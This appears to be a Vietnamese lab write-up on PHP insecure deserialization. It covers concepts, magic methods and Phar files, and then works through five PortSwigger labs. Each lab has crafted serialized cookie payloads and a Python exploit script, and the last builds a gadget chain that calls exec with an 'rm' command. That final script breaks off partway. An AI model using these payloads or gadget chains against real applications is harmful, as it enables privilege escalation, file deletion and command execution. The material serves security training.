# Insecure deserialization

## Khái niệm & Tác hại & Khai thác & phòng tránh

**Trước hết tìm hiểu về khái niệm serialization và deserialization:**

<ul>
    <li><b>Serialization</b>là quá trình xử lý, chuyển đổi các thuộc tính của một đối tượng thành một định dạng dữ liệu ví dụ như binary fomat, từ đó có thể lưu trên ổ đĩa, hoặc sử dụng vào các mục đích cần thiết khác, là quá trình chuyển đối của một đối tượng thành định dạng như chuỗi byte, JSON, YAML,… Mục đích chính của quá trình này để dễ dàng lưu trữ và truyền dữ liệu giữa các ứng dụng.
</li>
    <li><b>Deserialization</b> là quá trình ngược lại với serialization để chuyển từ những định dạng dữ liệu trên thành đối tượng ban đầu.
    </li>
</ul>

- Để hiểu rõ hơn về hai quá trình này, các bạn có thể hình dung công việc phải vận chuyển một tòa nhà từ vị trí này sang vị trí khác: Serialization là quá trình tháo dỡ tòa nhà thành từng viên gạch, và tạo ra một bản thiết kế thi công; Sau khi chuyển các viên gạch tới vị trí đích, quá trình Deserialization sẽ khôi phục lại tòa nhà từ bản thiết kế đó.

![image](https://hackmd.io/_uploads/B1GxI_yj6.png)

- Binary Serialization là quá trình chuyển đổi các đối tượng trong bộ nhớ thành một chuỗi các byte. Chuỗi này có thể được sử dụng để lưu trữ hoặc truyền qua mạng. Binary Serialization là định dạng hiệu quả và nhanh nhất trong số các phương pháp serialization, vì nó chỉ tạo ra một chuỗi byte duy nhất. Tuy nhiên, định dạng này có thể không tương thích giữa các nền tảng ngôn ngữ, công nghệ khác nhau hoặc các phiên bản khác nhau của chương trình.
- SOAP (Simple Object Access Protocol) Serialization là một phương thức serialization được sử dụng trong web service để truyền tải các thông tin giữa các ứng dụng khác nhau. SOAP Serialization sử dụng định dạng XML để tạo ra các tin nhắn trao đổi giữa các ứng dụng. SOAP Serialization có thể được sử dụng để gửi các yêu cầu (requests) và nhận các phản hồi (responses) từ các dịch vụ web.
- XML Serialization là quá trình chuyển đổi các đối tượng trong bộ nhớ thành một định dạng XML. Định dạng này có thể được sử dụng để lưu trữ hoặc truyền qua mạng. Với hình thức lưu trữ và truyền dưới dạng văn bản làm cho dữ liệu dễ đọc và tương thích giữa các nền tảng khác nhau. Tuy nhiên, định dạng này thường có độ phức tạp cao hơn và chậm hơn so với Binary Serialization.
- Ngoài ra lập trình viên có thể tự định nghĩa cách thức chuyển đổi một đối tượng trong bộ nhớ thành một định dạng có thể lưu trữ hoặc truyền qua mạng.
- <img src="https://hackmd.io/_uploads/rkdUuOvFT.png">
  <ul>
      <ul>
          <b>Khái niệm</b>
          <li>Lỗ hổng Insecure deserialization xảy ra khi kẻ tấn công có thể chỉnh sửa, thay đổi các đối tượng, dữ liệu sẽ được thực hiện Deserialize bởi ứng dụng. Họ có thể tận dụng các object sẵn có của ứng dụng, tạo ra các quá trình deserialization theo mục đích riêng, thậm chí có thể dẫn đến tấn công thực thi mã từ xa (RCE). Tấn công deserialization cũng được gọi với cái tên khác là Object injection.</li>
           <img src="https://images.viblo.asia/8760c903-d212-4ffd-9aab-c7a2954d017b.png">
     <li>Vậy nguyên nhân chính là do việc ứng dụng web để người dùng có thể kiểm soát được các dữ liệu sau khi serialize đối tượng nào đó (gọi là serialized data), khi thay đổi chúng ứng dụng sẽ thực hiện quá trình deserialization để khôi phục lại đối tượng ban đầu và đương nhiên đối tượng đó sẽ bị thay đổi và có thể gây ra ảnh hưởng tới ứng dụng</li>
          <li>Trong PHP, thực hiện quá trình serialization bằng hàm serialize(), và quá trình deserialization bằng hàm unserialize().</li>
      </ul>
      <ul>
          <b>Tác hại</b>
          <li>Thực thi các mã độc trên ứng dụng, có thể RCE.</li>
          <li>Thay đổi các thuộc tính đối tượng,...</li>
          <li>Gây tràn bộ nhớ ảnh hưởng tới ứng dụng và máy chủ.</li>
      </ul>
      <ul>
          <b>Khai thác</b> 
          <li>Sửa đổi đối tượng</li>
          <li>POP chain: 1 kỹ thuật liên quan đến việc sử dụng lại các đoạn code của chương trình (gọi là các gadget) để liên kết chúng lại thành 1 chuỗi thực thi (chain) đồng thời kết hợp với việc thay đổi các thuộc tính của các đối tượng tạo ra một luồng hoạt động với mục đích tấn công ứng dụng.</li>
          <li>Overflow</li>
          <li>Phar Deserialization: Giống như tệp JAR của java, ở PHP ta có thể chia sẻ thư viện hoặc toàn bộ ứng dụng dưới dạng một tệp duy nhất đó là PHAR (PHP Archive). Phar là một phần mở rộng trong php, có thể hiểu nôm na nó giống như 1 file zip và bên trong nó chứa mã nguồn php hoặc giống như một kho lưu trữ mã nguồn PHP vậy, nghĩa là tập hợp include các file PHP vào chung 1 phar khi excute thì sẽ tự động thực thi toàn bộ các file PHP bên trong nó mà không cần phải extract các PHP đó vào một thư mục nào trước đó cả.
              <ul>
                  <li>Dưới đây là một ví dụ về luồng để giúp bạn hình dung một cuộc tấn công Phar Deserialization như thế nào:</li>
          <img src="https://truongtn.files.wordpress.com/2021/05/visualization-of-a-property-oriented-programming-pop-attack.png">
              </ul>
          </li>
      </ul>
      <ul>
          <b>Phòng chống</b>
          Tốt nhất là không dùng dữ liệu từ người dùng để thực hiện quá trình deserialization.
  Tuy nhiên trong trường hợp phải dùng thì cần:
          <ul>
              <li>Xác mính tính toàn vẹn của dữ liệu ví dụ như dùng chữ ký số,...</li>
              <li>Giới hạn quyền truy cập, chạy ứng dụng trong quyền thấp.</li>
              <li>Kiểm tra đầu vào.</li>
              <li>Cập nhật các bản vá bảo mật cho các ứng dụng và hệ thống phần mềm để giảm thiểu các lỗ hổng bảo mật.</li>
          </ul>
      </ul>
  </ul>

### Magic method

**Magic method** là các function đặc biệt trong các lớp của PHP, tên của các function này có hai dấu gạch dưới đứng trước, nó sẽ được gọi ngầm ở một sự kiện cụ thể, ví dụ như: **\_\_sleep()**, **\_\_toString()**: `được call khi một đối tượng được gọi như một chuỗi`, **\_\_construct()** : `sẽ được call khi một đối tượng được khởi tạo`, …. Phần lớn trong số các function này sẽ không làm gì nếu không có sự khai báo, thiết lập của người lập trình. Ở đây có hai Magic method có thể trigger được lỗi Phar Deserialization mà ta cần quan tâm đến là:

- **\_\_wakeup()**: Được gọi khi một đối tượng được deserialize

- **\_\_destruct()**: Được gọi khi một kịch bản PHP kết thúc hoặc một đối tượng không còn được dùng trong code nữa và bị hủy bỏ

![image](https://hackmd.io/_uploads/Hyq-CzJsp.png)

![image](https://hackmd.io/_uploads/S1Xf0Myip.png)

Đoạn code tại Hình 1 và kết quả ở Hình 2 đã cho thấy function **wakeup() được gọi ngay sau khi một đối tượng thuộc lớp Test được deserialize, và khi kết thúc đoạn kịch bản PHP trên, function **destruct() cũng ngay lập tức được gọi ngầm.

- Kẻ tấn công có thể thêm object từ bất kỳ class vào metadata của PHAR. Khi file PHAR được kích hoạt bên trong code PHP, tiến trình “deserialization” của PHAR cũng được kích hoạt cmnl.

Chương trình sẽ load các object đã được định trước trong metadata của PHAR (nếu nó thuộc về một class có trong code PHP). Ở PHP người ta có một số method mà khi có một sự kiện nhất định sẽ được gọi, người ta gọi là magic method (ma dịch mê thọt), trong chủ đề này ta chỉ quan tâm 02 thằng magic method là **\_\_wakeup()** và **\_\_destruct()**, vì chúng được gọi khi một object cần **unserialized** hoặc **destroyed**. Hãy tập trung vào \_\_destruct() vì rất có thể nó đã được định nghĩa trong code PHP của ứng dụng mục tiêu rồi.

### Cấu trúc của một file phar

- **Stub**: đơn giản nó là một file PHP mà ta cần gói lại và ít nhất phải chứa đoạn code sau:`<?php __HALT_COMPILER();`.
- A **manifest** (bảng kê khai): miêu tả khái quát nội dung sẽ có trong file
- **File Contents**: Nội dung chính của file
- **Signature**: Chữ ký để kiểm tra tính toàn vẹn, là một hàm băm của file archive, ta phải có chữ ký hợp lệ nếu muốn truy cập file archive từ PHP

Điểm đáng chú ý nhất trong cấu trúc của một Phar file đó là phần manifest, theo Manual của PHP thì trong mỗi một Phar file, phần manifest có chứa các thông tin sau:

- ![image](https://hackmd.io/_uploads/HJPGNIksT.png)
- ở dòng dưới cùng, nơi đó sẽ chứa những Meta-data đã được serialize và nó sẽ được unserialize nếu được trigger bởi các filesystem function khi gọi đến một Phar thông qua `phar:// stream wrapper` (Cái này là một stream wrapper cho phép chúng ta có thể truy cập vào các file bên trong một file phar thông qua các filesytstem function ).
- Dưới đây là danh sách các filesystem function có thể trigger lỗ hổng này:

![image](https://hackmd.io/_uploads/S1plHI1sT.png)

- Bất cứ một “hoạt động tệp” tác động đến tệp PHAR mà sử dụng wrapper phar:// thì những metadata này sẽ tự động deserialized. `file_get_contents('phar://./archives/app.phar')`

Dưới đây là một ví dụ về luồng để giúp bạn hình dung một cuộc tấn công Phar Deserialization như thế nào:

![image](https://hackmd.io/_uploads/rkJJFLkip.png)

- Đầu tiên là ta sẽ build file PHAR sử dụng PHP PHAR class
- Tiếp theo sẽ upload file lên sever
- Tên của archiver cần phải bắt đầu bằng wrapper phar://
- Sau đó sẽ được file operator deserialized bằng việc load các Oblject có trong trường mainfest của file phar vào trong chương trình hiện tại
- Cuối cùng lợi dụng các magic method để thực hiện các vụ không mong muốn.

- Ta có thể thấy format serialized data trong Java khác hoàn toàn so với serialized data trong PHP

![image](https://hackmd.io/_uploads/rybwvRxsa.png)

```php!
<!-- Serialized data trong PHP -->

O:4:"User":2:{s:10:"\0User\0name";N;s:9:"\0User\0age";N;}
```

Serialized data của Java sẽ có cấu trúc như sau

![image](https://hackmd.io/_uploads/B1ZiDRxjp.png)

## 1. Lab: Modifying serialized objects

### Đề bài

![image](https://hackmd.io/_uploads/r1pcTqPFp.png)

### Phân tích

<ul>
    <li>đề bài yêu cầu chúng ta tận dụng lỗi Insecure deserialization ở cookie và leo thang đặc quyền để xóa người dùng là carlos
    </li>
    <li>mình đã đăng nhập bằng tài khoản <b>wiener:peter</b> rồi chặn gói tin ở burp suite và view details 1 sản phầm</li>
    <img src="https://hackmd.io/_uploads/rJfpHjwt6.png">
</ul>

và mình bắt được gói tin có chứa thông tin về cookie mà mình có thể thay đổi được

![image](https://hackmd.io/_uploads/SkBW8iPtp.png)

mình đưa vào repeater và burp suite tự động lần lượt decode url và base 64 cho mình ở góc bên trái

![image](https://hackmd.io/_uploads/r1Z_IsPFp.png)

<ul>
    <ul>mình có được 1 đối tượng là User có các thuộc tính là : 
        <li>username kiểu string tên là wiener</li>
        <li>admin kiểu boolean với giá trị là 0 (false)</li>
    </ul>
    <li>vậy điều gì xảy ra nếu mình thay đổi được giá trị admin=1 trong cookie này, mình có leo thang đặc quyền lên admin không</li>
</ul>

### Khai thác

mình đã thay đổi giá trị của thuộc tính admin của đối tượng này và có được quyền admin

![image](https://hackmd.io/_uploads/rk25uiwFp.png)

![image](https://hackmd.io/_uploads/H1mXtiwY6.png)

mình chuyển đến trang admin và xóa người dùng carlos

![image](https://hackmd.io/_uploads/SJZX5ovYa.png)

![image](https://hackmd.io/_uploads/BJPo5iDFT.png)

và mình đã thành công solve được lab

với data `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`bài có thể dùng đoạn mã này để tạo đối tượng

```php!
class User {
    public $username;
    public $admin;
}

$user = new User();
$user->username = "wiener";
$user->admin = 0;
```

và đoạn code kiểm tra

```php!
 if ($session_data->admin) {
            echo "You are an admin!";
        } else {
            echo "You are not an admin.";
        }
```

Mã hóa lại theo các thuật toán, bypass thành công với quyền administrator:

```php!
class User {
    public $username;
    public $admin;
}

$user = new User();
$user->username = "wiener";
$user->admin = "abc";
echo urlencode(base64_encode(serialize($user)));
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D
```

![image](https://hackmd.io/_uploads/B14sEYJs6.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0ac3002203c81af885c53ab3004800d2.web-security-academy.net'

session = requests.Session()

data = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + "/login",
    data = data,
    verify=False
)

cookies = {
    'session': "%54%7a%6f%30%4f%69%4a%56%63%32%56%79%49%6a%6f%79%4f%6e%74%7a%4f%6a%67%36%49%6e%56%7a%5a%58%4a%75%59%57%31%6c%49%6a%74%7a%4f%6a%59%36%49%6e%64%70%5a%57%35%6c%63%69%49%37%63%7a%6f%31%4f%69%4a%68%5a%47%31%70%62%69%49%37%59%6a%6f%78%4f%33%30%3d",
}

response = session.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/S1trCsDK6.png)

chỉ còn delete wiener
![image](https://hackmd.io/_uploads/B1lQCsPKT.png)

mục đích của chúng ta đã hoàn thành khi trang web chuyển hướng chúng ta đến xóa carlos và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/r1Ld2sDF6.png)

mình đưa vào repeater và burp suite tự động lần lượt decode url và base 64 cho mình ở góc bên trái

![image](https://hackmd.io/_uploads/BkV11TDKp.png)

lỗi của bài là không có cơ chế kiểm soát đầu vào của người dùng ở cả bên client và server

## 2. Lab: Modifying serialized data types

link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

### Đề bài

![image](https://hackmd.io/_uploads/By4rl6PKT.png)

### Phân tích

<ul>
    <li>đề bài yêu cầu chúng ta tận dụng lỗi Insecure deserialization ở cookie và leo thang đặc quyền để xóa người dùng là carlos
    </li>
    <li>mình đã đăng nhập bằng tài khoản <b>wiener:peter</b> rồi chặn gói tin ở burp suite và view details 1 sản phầm</li>
</ul>

và mình bắt được gói tin có chứa thông tin về cookie mà mình có thể thay đổi được

![image](https://hackmd.io/_uploads/BkMs0nwFp.png)

mình đưa vào repeater và burp suite tự động lần lượt decode url và base 64 cho mình ở góc bên trái

![image](https://hackmd.io/_uploads/SkrIypPY6.png)

<ul>
    <ul>mình có được 1 đối tượng là User có các thuộc tính là : 
        <li>username kiểu string tên là wiener</li>
        <li>access_token kiểu string với giá trị là <b>pbjlw0fes41o8uwbj0657gcotm01e5jp</b></li>
    </ul>
    <li>với admin mình sẽ cần có một token khác mà mình không biết giá trị của nó là gì </li>
    <li>đề bài có gợi ý chúng ta về so sánh kiểu dữ liệu trong PHP</li>
</ul>

![image](https://hackmd.io/_uploads/SJ2lWpDYa.png)

với kiểu so sánh loose **"=="** trong PHP chúng ta có thể thấy 1 chuỗi sẽ bằng với số 0. PHP sẽ cố gắng tìm 1 chữ số trong chuỗi và nếu không có số nào nó sẽ tự ép kiểu sang kiểu số là 0 và sẽ trả về true nếu chúng ta thay đổi token của đối tượng

![image](https://hackmd.io/_uploads/ByN4-2uFp.png)

![image](https://hackmd.io/_uploads/r104ZndY6.png)

![image](https://hackmd.io/_uploads/rkOHZ3OK6.png)

![image](https://hackmd.io/_uploads/rJbIWn_FT.png)

### Khai thác

mình sửa lại thuộc tính và lấy được quyền admin

![image](https://hackmd.io/_uploads/HkRMz6DYT.png)

![image](https://hackmd.io/_uploads/B1PEQTDtT.png)

và tương tự bài trước mình xóa được carlos

![image](https://hackmd.io/_uploads/Bku14pPFp.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0ad80051032f412f875db2a9004800d1.web-security-academy.net'

session = requests.Session()

# Đăng nhập
data_login = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa carlos
response = requests.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/ryBSThvYa.png)

delete success chỉ còn delete wiener

![image](https://hackmd.io/_uploads/rJFIpnvtp.png)

mục đích của chúng ta đã hoàn thành khi trang web chuyển hướng chúng ta đến xóa carlos và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/HJNWXnvt6.png)

lỗi của bài là không so sánh nghiệm ngặt kiểu dữ liệu trong PHP

## 3.Lab: Using application functionality to exploit insecure deserialization

link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization

### Đề bài

![image](https://hackmd.io/_uploads/Hy8IEpDFT.png)

### Phân tích

<ul>
    <li>đề bài yêu cầu chúng ta tận dụng lỗi Insecure deserialization ở cookie xóa file morale.txt của carlos và mình thử thay đổi token như bài trước nhưng không được có thể bài đã dùng <b>"==="</b> để so sánh nghiêm ngặt cả kiểu dữ liệu 
    </li>
    <img src = "https://hackmd.io/_uploads/Bk52UawY6.png">
    <li>mình đã đăng nhập bằng tài khoản <b>wiener:peter</b> rồi chặn gói tin ở burp suite và view details 1 sản phầm</li>
</ul>

và mình bắt được gói tin có chứa thông tin về cookie mà mình có thể thay đổi được

![image](https://hackmd.io/_uploads/HkLzrpwF6.png)

mình đưa vào repeater và burp suite tự động lần lượt decode url và base 64 cho mình ở góc bên trái

![image](https://hackmd.io/_uploads/rJ84rawK6.png)

<ul>
    <ul>mình có được 1 đối tượng là User có các thuộc tính là : 
        <li>username kiểu string tên là wiener</li>
        <li>access_token kiểu string với giá trị là <b>pbjlw0fes41o8uwbj0657gcotm01e5jp</b></li>
        <li>avatar kiểu string có giá trị là đường dẫn thư mục đến avatar của wiener</li>
    </ul>
    <li>và mình có thể xóa được tài khoản của mình </li>
</ul>

![image](https://hackmd.io/_uploads/SkQmPawYp.png)

vậy điều gì xảy ra nếu mình upload avatar nhưng đường dẫn của nó trỏ đến file morale.txt của carlos

### Khai thác

`s:11:"avatar_link";s:23:"/home/carlos/morale.txt"`

mình sẽ thay đổi đường dẫn avatar đến thư mục cần xóa và sau đó xóa tài khoản của mình và thư mục của carlos cũng sẽ bị xóa theo

![image](https://hackmd.io/_uploads/rkt4aTDY6.png)

![image](https://hackmd.io/_uploads/S1f7RTwFT.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0a4900ad03613167814c9dd900600021.web-security-academy.net'

session = requests.Session()

# Đăng nhập
data_login = {
    'username': 'gregg',
    'password': 'rosebud',
}

response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"sqjois2i0db7c57ixs64wyh0kq797nm4";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa carlos
response = requests.post(
    url + '/my-account/delete',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/BJe3A6PY6.png)

mục đích của chúng ta đã hoàn thành khi trang web chuyển hướng chúng ta đến xóa carlos và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/B1_thTwtp.png)

lỗi của bài này là không xác thực các đường dẫn thư mục thuộc về người đó trước khi xóa tài khoản

## 4. Lab: Arbitrary object injection in PHP

link: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

### Đề bài

![image](https://hackmd.io/_uploads/Bk-f-WOKa.png)

### Phân tích

<ul>
    <li>bài gợi ý chúng ta dùng <b>~</b> để đọc source code của file backup và tiêm một đối tượng vào chương trình qua lỗ hổng  Insecure deserialization để xóa file morale của người dùng Carlos</li>
    <li>tương tự những bài trước mình bắt được gói tin chứa cookie có thể thay đổi được</li>
    <img src ="https://hackmd.io/_uploads/SkHb4WdYT.png">
</ul>

![image](https://hackmd.io/_uploads/HkbBEb_FT.png)

<ul>
    <ul>mình có được 1 đối tượng là User có các thuộc tính là : 
        <li>username kiểu string tên là wiener</li>
        <li>access_token kiểu string với giá trị là <b>l2enk5ty0uwtgfeyq8n1pdi80nrjwhm5</b></li>
    </ul>
</ul>

từ side map ở phần Target mình thấy có 1 file CustomTemplate.php và như đề bài gợi ý chúng ta cần đọc file này và tiêm vào 1 đối tượng

![image](https://hackmd.io/_uploads/H1gUUW_YT.png)

mình thêm ~ để đọc file backup

![image](https://hackmd.io/_uploads/SyEnLb_tp.png)

mã nguồn có nội dung:

```php=
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

<ul>
    file định nghĩa 1 class:
    <li>có 2 biến là $template_file_path, $lock_file_path</li>
    <li>đầu tiên đối tượng được tạo sẽ được khởi tạo giá trị: lock_file_path = $template_file_path . ".lock"</li>
    <li>Ta chỉ cần quan tâm magic method __destruct() khi nó thực hiện xóa file tại lock_file_path nếu nó tồn tại. Mặt khác __destruct() sẽ được gọi là server thực hiện deserialize.</li>
</ul>

Trong ngôn ngữ lập trình PHP, \_\_destruct() là một phương thức đặc biệt trong các lớp (classes) được sử dụng để thực hiện các công việc cuối cùng trước khi một đối tượng bị hủy (destroyed). Phương thức này tự động được gọi khi không còn đối tượng nào tham chiếu đến một đối tượng cụ thể nữa hoặc khi chương trình kết thúc.

Mục tiêu chính của \_\_destruct() là để giải phóng bất kỳ tài nguyên nào mà đối tượng có thể giữ, như đóng kết nối cơ sở dữ liệu, đóng tệp, giải phóng bộ nhớ, hoặc thực hiện bất kỳ việc dọn dẹp nào khác cần thiết trước khi đối tượng bị hủy.

```php!
function __destruct() {
    // Carlos thought this would be a good idea
    if (file_exists($this->lock_file_path)) {
        unlink($this->lock_file_path);
    }
}
```

- Đọc hiểu luồng hoạt động của phương thức: Nếu tồn tại tệp tin có đường dẫn $this->lock_file_path sẽ thực hiện hàm unlink() xóa tệp tin này. Ý tưởng đã khá rõ ràng, nếu kẻ tấn công có thể lợi dụng quá trình deserialization của ứng dụng nhằm xóa bất kỳ tệp tin nào trong hệ thống nếu họ biết chính xác đường dẫn.
<ul>
    <li>Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:</li>
</ul>

```
O:14:"CustomTemplate":1{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Server sẽ thực hiện deserialize CustomTemplate object trên → hàm \_\_destruct() được kích hoạt → file /home/carlos/morale.txt bị xóa.

Gửi request với session cookie mới. Mặc dù server trả 500 vì invalid user nhưng payload trên đã được deserialize

![image](https://hackmd.io/_uploads/B1Nc0buFp.png)

Xây dựng script tạo payload xóa tệp tin /home/carlos/morale.txt do bài lab yêu cầu:

```php!
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path = "/home/carlos/morale.txt";
}

$payload = new CustomTemplate();
echo urlencode(base64_encode(serialize($payload)));
// TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzQ6IgBDdXN0b21UZW1wbGF0ZQB0ZW1wbGF0ZV9maWxlX3BhdGgiO047czozMDoiAEN1c3RvbVRlbXBsYXRlAGxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D
```

![image](https://hackmd.io/_uploads/r1n8qn1j6.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0ac100c20301582f81ce454e00f300f8.web-security-academy.net'

session = requests.Session()

# Đăng nhập
data_login = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa carlos
response = requests.get(
    url + '/product?productId=1',
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Sk7a0bdYT.png)

mục đích của chúng ta đã hoàn thành và chúng ta cũng đã giải quyết được bài lab

![image](https://hackmd.io/_uploads/B1d9A-dta.png)

lỗi của bài này là đã để các hàm ảnh hưởng đến đối tượng nhưng không kiểm tra đầu vào khi chúng ta có thể tạo đối tượng tùy ý

## 5. Developing a custom gadget chain for PHP deserialization

link:https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization

### Đề bài

![image](https://hackmd.io/_uploads/SkpBhdxoa.png)

### Phân tích

tương tự những bài trước mình bắt được gói tin

![image](https://hackmd.io/_uploads/r1KBwp_ta.png)

![image](https://hackmd.io/_uploads/H1Wjvadt6.png)

mình thấy vẫn có đối tượng User có

<ul>
    <li>accessToken</li>
    <li>username</li>
</ul>

![image](https://hackmd.io/_uploads/H1ZWupuF6.png)

vào site map mình thấy có file CustomTemplate.php

![image](https://hackmd.io/_uploads/ry48OT_Yp.png)

mình thêm **~** và đọc được file backup là:

```php=
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

Đây là định nghĩa của class CustomTemplate kèm theo các class phụ khác. Ta sẽ phân tích như sau để tạo gadget chain:

<ul>
    <li>Một DefaultMap object khi gọi đến một thuộc tính không tồn tại hay inaccessible thì __get($name) được gọi → call_user_func($callback, $name) được gọi.</li>
    <li>khi một serialized CustomTemplate object được deserialize</li>
    <ul>
        <li>Hàm __wakeup() được gọi → Hàm build_product() được gọi</li>
        <li>Tại hàm build_product() khởi tạo một object Product($default_desc_type, $desc) → Hàm __construct() của class Product được gọi → $desc->$default_desc_type được gọi.</li>
        <li>Như vậy nếu như $desc là một DefaultMap object và $default_desc_type chính là tham số $name trong hàm __get(), thì $desc->$default_desc_type sẽ trở thành call_user_func($callback, $default_desc_type);</li>
        <li>Và khi đó, nếu callback là 1 hàm như eval hay exec, ta có thể thực thi lệnh OS với câu lệnh chính là $default_desc_type</li>
    </ul>
</ul>

### Khai thác

Dựa vào phân tích trên, ta tạo đoạn code generate payload như sau để xóa file /home/carlos/morale.txt:

```php=
<?php

class DefaultMap {
    public $callback;
}

class CustomTemplate {
    public $default_desc_type;
    public $desc;
}

$b = new DefaultMap();
$b->callback = "exec";

$a = new CustomTemplate();
$a->default_desc_type = "rm /home/carlos/morale.txt";
$a->desc = $b;

$payload = serialize($a);
print_r($payload);
?>
```

![image](https://hackmd.io/_uploads/HJgKBadF6.png)

Thực thi đoạn code trên và mình có payload là 1 serialized CustomTemplate object.

```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

tương tự các bài trước mình encode url và base64 và gửi lại gói tin đã sửa cookie vào burp suite và giải quyết được bài lab

mình đã viết lại script khai thác:

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0a4400490495946f85c3ad2e001000d0.web-security-academy.net'

session = requests.Session()

# Đăng nhập
data_login = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
